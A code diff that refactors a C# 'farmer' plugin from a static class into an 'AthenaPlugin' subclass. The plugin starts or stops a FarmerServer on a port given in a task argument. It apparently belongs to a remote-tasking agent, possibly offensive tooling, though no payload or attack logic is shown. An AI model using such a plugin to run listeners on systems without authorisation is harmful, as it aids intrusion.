@@ -1,13 +1,12 @@
-﻿using PluginBase;
-namespace Plugin
+﻿using Plugin;
+using PluginBase;
+namespace Plugins
 {
-    public static class farmer
+    public class Plugin : AthenaPlugin
     {
-        private static FarmerServer farm = new FarmerServer();
-
-        public static void Execute(Dictionary<string, object> args)
+        private FarmerServer farm = new FarmerServer();
+        public override void Execute(Dictionary<string, object> args)
         {
-
             if (!int.TryParse((string)args["port"], out Config.port))
             {
                 farm.Stop();
@@ -19,13 +18,14 @@ namespace Plugin
                     user_output = "Stopped Farmer."
                 });
             }
-            else {
+            else
+            {
                 Config.task_id = (string)args["task-id"];
                 PluginHandler.Write($"Starting farmer on port: {Config.port}", Config.task_id, false);
                 farm.Initialize(Config.port);
             }
         }
-        public static void Kill(Dictionary<string, object> args)
+        public void Kill(Dictionary<string, object> args)
         {
             try
             {
